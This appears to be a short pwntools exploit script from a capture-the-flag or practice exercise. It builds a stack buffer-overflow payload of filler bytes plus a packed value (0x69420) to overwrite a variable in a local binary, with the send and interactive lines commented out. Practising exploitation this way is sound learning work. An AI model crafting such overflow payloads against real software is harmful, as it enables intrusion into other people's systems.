from pwn import *
overwriteme=0x69420
p=process("./a.out")
#p.recvuntil("...")
print(p32(overwriteme))


offset = 272
dist = 4
payload=b"A" * (offset - dist) + p32(overwriteme)
#p.sendline(payload)
#p.interactive()